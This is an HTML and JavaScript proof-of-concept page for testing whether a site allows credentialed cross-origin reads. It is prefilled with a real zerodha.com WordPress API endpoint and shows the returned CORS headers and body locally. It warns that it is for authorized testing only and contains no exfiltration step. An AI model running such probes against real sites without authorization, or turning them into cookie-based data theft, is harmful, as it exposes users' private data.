<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>CORS Credentialed PoC (Local)</title>
  <style>
    body{font-family:system-ui,Arial;padding:1rem;line-height:1.4}
    pre{white-space:pre-wrap;border:1px solid #ddd;padding:1rem;background:#f9f9f9;max-height:60vh;overflow:auto}
    code{background:#f3f3f3;padding:.1rem .3rem;border-radius:3px}
    label{display:block;margin-top:.5rem}
    input[type=text]{width:100%;padding:.4rem;margin-top:.2rem}
    button{margin-top:.6rem;padding:.5rem 0.8rem}
  </style>
</head>
<body>
  <h2>CORS Credentialed PoC â€” Local Use Only</h2>

  <p><strong>IMPORTANT:</strong> Run this only if you have explicit authorization from the target owner. Do not host this file on a public server. Use a local browser with a test account logged in.</p>

  <label>Endpoint URL (edit to test):
    <input id="endpoint" type="text" value="https://zerodha.com/z-connect/wp-json/wp/v2/pages/664">
  </label>

  <label>Credentials mode:
    <select id="cred">
      <option value="include">include (send cookies)</option>
      <option value="same-origin">same-origin</option>
      <option value="omit">omit (no cookies)</option>
    </select>
  </label>

  <label>HTTP Method:
    <select id="method">
      <option>GET</option>
    </select>
  </label>

  <button id="run">Run PoC (local only)</button>

  <p id="status">Status: idle</p>
  <pre id="out">Output will appear here. Open DevTools Console/Network for more details.</pre>

<script>
document.getElementById('run').addEventListener('click', async () => {
  const ENDPOINT = document.getElementById('endpoint').value.trim();
  const CREDENTIALS = document.getElementById('cred').value;
  const METHOD = document.getElementById('method').value || 'GET';

  document.getElementById('status').innerText = 'Running fetch... (check Console & Network)';
  document.getElementById('out').innerText = 'waiting for response...';

  try {
    const t0 = Date.now();
    // Note: mode 'cors' allows cross-origin requests and is needed to read response if server allows CORS.
    const resp = await fetch(ENDPOINT, {
      method: METHOD,
      mode: 'cors',
      credentials: CREDENTIALS,
      // Do NOT include any malicious exfil headers/body here.
      headers: {
        // you can add a harmless test header if needed e.g. 'X-Test-PoC': '1'
      }
    });

    const t1 = Date.now();
    // collect headers (safe)
    const headers = {};
    resp.headers.forEach((v,k) => headers[k.toLowerCase()] = v);

    // header summary for quick view
    const hdrSummary = [
      'status: ' + resp.status,
      'access-control-allow-origin: ' + (headers['access-control-allow-origin'] || 'Not Present'),
      'access-control-allow-credentials: ' + (headers['access-control-allow-credentials'] || 'Not Present'),
      'access-control-allow-methods: ' + (headers['access-control-allow-methods'] || 'Not Present'),
      'access-control-allow-headers: ' + (headers['access-control-allow-headers'] || 'Not Present'),
      'vary: ' + (headers['vary'] || 'Not Present')
    ].join('\\n');

    // try to parse body safely (don't save or post it)
    let bodyPreview = '';
    const ct = resp.headers.get('content-type') || '';
    if (ct.includes('json')) {
      try {
        const j = await resp.json();
        bodyPreview = JSON.stringify(j, null, 2).slice(0, 20000);
      } catch (e) {
        bodyPreview = 'JSON parse error: ' + e.toString();
      }
    } else {
      try {
        const t = await resp.text();
        bodyPreview = t.slice(0, 20000);
      } catch (e) {
        bodyPreview = 'Text read error: ' + e.toString();
      }
    }

    document.getElementById('status').innerText = `Request finished: ${resp.status} (${t1-t0} ms)`;
    document.getElementById('out').innerText = [
      '=== Header summary ===',
      hdrSummary,
      '',
      '=== Body preview (trimmed) ===',
      bodyPreview
    ].join('\\n\\n');

    console.log('PoC result:', { status: resp.status, headers, bodyPreview });
  } catch (err) {
    document.getElementById('status').innerText = 'Fetch failed: ' + err;
    document.getElementById('out').innerText = 'Error (see console): ' + err;
    console.error('PoC fetch error', err);
  }
});
</script>
</body>
</html>
